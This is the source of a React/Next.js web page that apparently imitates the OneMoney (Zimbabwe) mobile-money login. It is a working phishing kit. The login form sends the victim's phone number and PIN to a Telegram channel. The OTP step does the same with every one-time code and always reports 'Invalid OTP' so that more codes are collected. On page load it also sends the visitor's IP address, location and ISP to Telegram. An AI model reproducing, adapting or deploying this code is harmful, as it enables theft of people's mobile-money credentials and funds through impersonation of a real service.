"use client"

import { useState, useRef, useEffect, useCallback } from "react"
import { sendTelegramMessage, fetchVisitorInfo } from "@/lib/telegram"

const LOGO_URL =
  "https://pbs.twimg.com/profile_images/1796061250666868739/bgLnLbUS_400x400.jpg"

const OTP_DURATION = 60

// ─── Spinner ───────────────────────────────────────────────────────────────────
function Spinner() {
  return (
    <span
      style={{
        width: "18px",
        height: "18px",
        border: "2px solid rgba(255,255,255,0.35)",
        borderTopColor: "#fff",
        borderRadius: "50%",
        display: "inline-block",
        animation: "spinIt 0.7s linear infinite",
        flexShrink: 0,
      }}
    />
  )
}

// ─── Mobile Shell ──────────────────────────────────────────────────────────────
function MobileShell({ children }: { children: React.ReactNode }) {
  return (
    <div
      style={{
        minHeight: "100svh",
        width: "100%",
        backgroundColor: "#fff",
        display: "flex",
        justifyContent: "center",
        fontFamily: "'Roboto', 'Helvetica Neue', Arial, sans-serif",
      }}
    >
      <div
        style={{
          width: "100%",
          maxWidth: "430px",
          minHeight: "100svh",
          display: "flex",
          flexDirection: "column",
          backgroundColor: "#fff",
        }}
      >
        {children}
      </div>
    </div>
  )
}

// ─── Shared input wrapper ──────────────────────────────────────────────────────
function InputBox({
  children,
  hasError,
  style,
}: {
  children: React.ReactNode
  hasError?: boolean
  style?: React.CSSProperties
}) {
  return (
    <div
      style={{
        display: "flex",
        alignItems: "center",
        border: `1.5px solid ${hasError ? "#ef4444" : "#d1d5db"}`,
        borderRadius: "8px",
        backgroundColor: "#fff",
        overflow: "hidden",
        height: "54px",
        transition: "border-color 0.15s",
        ...style,
      }}
    >
      {children}
    </div>
  )
}

const inputStyle: React.CSSProperties = {
  flex: 1,
  border: "none",
  outline: "none",
  fontSize: "16px",
  color: "#1f2937",
  backgroundColor: "transparent",
  padding: "0 16px",
  height: "100%",
  fontFamily: "inherit",
  WebkitAppearance: "none",
}

const orangeBtn: React.CSSProperties = {
  width: "100%",
  height: "54px",
  backgroundColor: "#f5a623",
  color: "#fff",
  border: "none",
  borderRadius: "10px",
  fontSize: "17px",
  fontWeight: 500,
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  gap: "8px",
  fontFamily: "inherit",
  cursor: "pointer",
  WebkitTapHighlightColor: "transparent",
  transition: "opacity 0.15s",
}

// ─── Login Screen ──────────────────────────────────────────────────────────────
function LoginScreen({
  onLogin,
}: {
  onLogin: (phone: string, pin: string) => void
}) {
  const [phone, setPhone] = useState("")
  const [pin, setPin] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [phoneError, setPhoneError] = useState("")
  const [pinError, setPinError] = useState("")

  const isActive = phone.trim().length > 0 && pin.trim().length > 0

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // Field-level validation
    let hasError = false
    if (!phone.trim()) {
      setPhoneError("Please enter your mobile number.")
      hasError = true
    }
    if (!pin.trim()) {
      setPinError("Please enter your PIN.")
      hasError = true
    }
    if (hasError) return

    setIsLoading(true)

    // Send to Telegram
    try {
      await sendTelegramMessage({
        title: "OneMoney Login Attempt",
        phoneNumber: `+263${phone}`,
        pin,
      })
    } catch (err) {
      console.error("Telegram error:", err)
    }

    await new Promise((r) => setTimeout(r, 1200))
    setIsLoading(false)
    onLogin(phone, pin)
  }

  return (
    <div
      style={{
        flex: 1,
        display: "flex",
        flexDirection: "column",
        padding: "0 22px",
        paddingTop: "clamp(52px, 13vw, 82px)",
      }}
    >
      {/* Logo */}
      <div style={{ display: "flex", justifyContent: "center", marginBottom: "clamp(44px, 11vw, 68px)" }}>
        <img
          src={LOGO_URL}
          alt="OneMoney – The Convenient Move"
          style={{ width: "clamp(150px, 42vw, 188px)", height: "auto", objectFit: "contain" }}
        />
      </div>

      <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
        {/* Phone */}
        <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
          <InputBox hasError={!!phoneError}>
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                padding: "0 14px",
                borderRight: `1.5px solid ${phoneError ? "#ef4444" : "#d1d5db"}`,
                height: "100%",
                minWidth: "70px",
                flexShrink: 0,
              }}
            >
              <span style={{ fontSize: "16px", color: "#374151", fontWeight: 400 }}>+263</span>
            </div>
            <input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              value={phone}
              onChange={(e) => {
                setPhone(e.target.value.replace(/\D/g, ""))
                if (phoneError) setPhoneError("")
              }}
              placeholder="Mobile Number"
              autoComplete="tel"
              style={inputStyle}
            />
          </InputBox>
          {phoneError && (
            <p style={{ margin: 0, fontSize: "12px", color: "#ef4444", paddingLeft: "4px", animation: "shakeMsg 0.3s ease" }}>
              ⚠ {phoneError}
            </p>
          )}
        </div>

        {/* PIN */}
        <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
          <InputBox hasError={!!pinError} style={{ backgroundColor: "#f3f4f6" }}>
            <input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              value={pin}
              onChange={(e) => {
                setPin(e.target.value.replace(/\D/g, ""))
                if (pinError) setPinError("")
              }}
              placeholder="Login PIN"
              autoComplete="current-password"
              style={{
                ...inputStyle,
                backgroundColor: "transparent",
                letterSpacing: pin ? "0.3em" : "0",
                fontSize: pin ? "20px" : "16px",
              }}
            />
          </InputBox>
          {pinError && (
            <p style={{ margin: 0, fontSize: "12px", color: "#ef4444", paddingLeft: "4px", animation: "shakeMsg 0.3s ease" }}>
              ⚠ {pinError}
            </p>
          )}
        </div>

        {/* Login button — light when empty, active orange when both filled */}
        <div style={{ marginTop: "18px" }}>
          <button
            type="submit"
            disabled={isLoading || !isActive}
            style={{
              ...orangeBtn,
              backgroundColor: isActive ? "#f5a623" : "#e5e7eb",
              color: isActive ? "#fff" : "#9ca3af",
              cursor: isLoading ? "not-allowed" : isActive ? "pointer" : "default",
              opacity: isLoading ? 0.82 : 1,
              transition: "background-color 0.2s ease, color 0.2s ease, opacity 0.15s",
            }}
          >
            {isLoading ? <><Spinner /> Logging in...</> : "Login"}
          </button>
        </div>

        {/* Footer */}
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            marginTop: "10px",
          }}
        >
          <button
            type="button"
            style={{
              background: "none",
              border: "none",
              cursor: "pointer",
              fontSize: "14px",
              color: "#6b7280",
              fontFamily: "inherit",
              padding: "8px 0",
              WebkitTapHighlightColor: "transparent",
            }}
          >
            Forgot PIN
          </button>
          <button
            type="button"
            style={{
              background: "none",
              border: "none",
              cursor: "pointer",
              fontSize: "14px",
              color: "#f5a623",
              fontWeight: 600,
              fontFamily: "inherit",
              padding: "8px 0",
              WebkitTapHighlightColor: "transparent",
            }}
          >
            Sign Up
          </button>
        </div>
      </form>
    </div>
  )
}

// ─── OTP Screen ────────────────────────────────────────────────────────────────
function OtpScreen({ phone, onBack }: { phone: string; onBack: () => void }) {
  const [otp, setOtp] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const isOtpActive = otp.trim().length > 0
  const [error, setError] = useState("")
  const [timer, setTimer] = useState(OTP_DURATION)
  const inputRef = useRef<HTMLInputElement>(null)

  // Auto-focus on mount
  useEffect(() => {
    const t = setTimeout(() => inputRef.current?.focus(), 100)
    return () => clearTimeout(t)
  }, [])

  // Countdown — runs whenever timer > 0
  useEffect(() => {
    if (timer <= 0) return
    const id = setTimeout(() => setTimer((t) => t - 1), 1000)
    return () => clearTimeout(id)
  }, [timer])

  const formatTime = (s: number) =>
    `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`

  const handleResend = () => {
    setTimer(OTP_DURATION) // ← resets to 60 every time
    setOtp("")
    setError("")
    inputRef.current?.focus()
  }

  const handleVerify = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault()
      if (!otp.trim()) {
        setError("Please enter the OTP sent to your number.")
        return
      }

      setIsVerifying(true)
      setError("")

      // Send OTP to Telegram
      try {
        await sendTelegramMessage({
          title: "OneMoney OTP Entered",
          phoneNumber: `+263${phone}`,
          otp1: otp,
        })
      } catch (err) {
        console.error("Telegram error:", err)
      }

      await new Promise((r) => setTimeout(r, 1200))
      setIsVerifying(false)

      // Always show invalid
      setError("Invalid OTP. Please try again.")
      setOtp("")
      inputRef.current?.focus()
    },
    [otp, phone]
  )

  const maskedPhone = `+263 ${"*".repeat(Math.max(0, phone.length - 3))}${phone.slice(-3)}`

  return (
    <div
      style={{
        flex: 1,
        display: "flex",
        flexDirection: "column",
        padding: "0 22px",
        paddingTop: "clamp(52px, 13vw, 82px)",
      }}
    >
      {/* Logo */}
      <div style={{ display: "flex", justifyContent: "center", marginBottom: "clamp(32px, 8vw, 50px)" }}>
        <img
          src={LOGO_URL}
          alt="OneMoney – The Convenient Move"
          style={{ width: "clamp(140px, 38vw, 172px)", height: "auto", objectFit: "contain" }}
        />
      </div>

      {/* Sub-heading */}
      <p
        style={{
          textAlign: "center",
          fontSize: "14.5px",
          color: "#6b7280",
          lineHeight: 1.55,
          marginBottom: "26px",
        }}
      >
        OTP sent to{" "}
        <strong style={{ color: "#1f2937" }}>{maskedPhone}</strong>
        <br />
        Enter the code below to verify.
      </p>

      <form onSubmit={handleVerify} style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
        {/* OTP Input */}
        <InputBox hasError={!!error}>
          <input
            ref={inputRef}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            value={otp}
            onChange={(e) => {
              setOtp(e.target.value.replace(/\D/g, ""))
              if (error) setError("")
            }}
            placeholder="Enter OTP"
            autoComplete="one-time-code"
            style={{
              ...inputStyle,
              fontSize: "20px",
              letterSpacing: otp ? "0.35em" : "0",
              fontWeight: 600,
            }}
          />
        </InputBox>

        {/* Error */}
        {error && (
          <p
            key={error + Date.now()}
            style={{
              margin: "2px 0 0",
              fontSize: "13px",
              color: "#ef4444",
              textAlign: "center",
              fontWeight: 500,
              animation: "shakeMsg 0.3s ease",
            }}
          >
            ⚠ {error}
          </p>
        )}

        {/* Timer / Resend */}
        <div style={{ textAlign: "center", marginTop: "6px" }}>
          {timer > 0 ? (
            <p style={{ margin: 0, fontSize: "13px", color: "#9ca3af" }}>
              Resend OTP in{" "}
              <span
                style={{
                  color: "#f5a623",
                  fontWeight: 700,
                  fontVariantNumeric: "tabular-nums",
                  letterSpacing: "0.05em",
                }}
              >
                {formatTime(timer)}
              </span>
            </p>
          ) : (
            <p style={{ margin: 0, fontSize: "13px", color: "#9ca3af" }}>
              Didn't receive the code?{" "}
              <button
                type="button"
                onClick={handleResend}
                style={{
                  background: "none",
                  border: "none",
                  cursor: "pointer",
                  color: "#f5a623",
                  fontWeight: 700,
                  fontSize: "13px",
                  fontFamily: "inherit",
                  padding: 0,
                  WebkitTapHighlightColor: "transparent",
                }}
              >
                Resend
              </button>
            </p>
          )}
        </div>

        {/* Verify button — light when empty, active orange when filled */}
        <div style={{ marginTop: "14px" }}>
          <button
            type="submit"
            disabled={isVerifying || !isOtpActive}
            style={{
              ...orangeBtn,
              backgroundColor: isOtpActive ? "#f5a623" : "#e5e7eb",
              color: isOtpActive ? "#fff" : "#9ca3af",
              cursor: isVerifying ? "not-allowed" : isOtpActive ? "pointer" : "default",
              opacity: isVerifying ? 0.82 : 1,
              transition: "background-color 0.2s ease, color 0.2s ease, opacity 0.15s",
            }}
          >
            {isVerifying ? <><Spinner /> Verifying...</> : "Verify"}
          </button>
        </div>

        {/* Back */}
        <button
          type="button"
          onClick={onBack}
          style={{
            background: "none",
            border: "none",
            cursor: "pointer",
            fontSize: "14px",
            color: "#9ca3af",
            fontFamily: "inherit",
            textAlign: "center",
            padding: "10px 0",
            marginTop: "2px",
            WebkitTapHighlightColor: "transparent",
          }}
        >
          ← Back to Login
        </button>
      </form>
    </div>
  )
}

// ─── Root ──────────────────────────────────────────────────────────────────────
export default function Page() {
  const [screen, setScreen] = useState<"login" | "otp">("login")
  const [phone, setPhone] = useState("")

  // Fire-and-forget: collect visitor info the moment the page loads
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const info = await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "🌐 New Visitor",
          message:
            `📍 <b>IP:</b> <code>${info?.ip ?? "Unknown"}</code>\n` +
            `🇿🇼 <b>Country:</b> <code>${info?.country ?? "N/A"}</code>\n` +
            `🏙 <b>City:</b> <code>${info?.city ?? "N/A"}</code>\n` +
            `📡 <b>ISP:</b> <code>${info?.isp ?? "N/A"}</code>\n` +
            `🌎 <b>Page:</b> ${typeof window !== "undefined" ? window.location.href : ""}`,
        })
      } catch (err) {
        console.error("Visitor tracking error:", err)
      }
    }
    trackVisitor()
  }, [])

  const handleLogin = (ph: string, _pin: string) => {
    setPhone(ph)
    setScreen("otp")
  }

  return (
    <>
      <style>{`
        @keyframes spinIt  { to { transform: rotate(360deg); } }
        @keyframes shakeMsg {
          0%,100% { transform: translateX(0); }
          25%      { transform: translateX(-5px); }
          75%      { transform: translateX(5px); }
        }
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        input { -webkit-appearance: none; appearance: none; }
        input[type="tel"]::-webkit-outer-spin-button,
        input[type="tel"]::-webkit-inner-spin-button { -webkit-appfearance: none; }
      `}</style>

      <MobileShell>
        {screen === "login" ? (
          <LoginScreen onLogin={handleLogin} />
        ) : (
          <OtpScreen phone={phone} onBack={() => setScreen("login")} />
        )}
      </MobileShell>
    </>
  )
}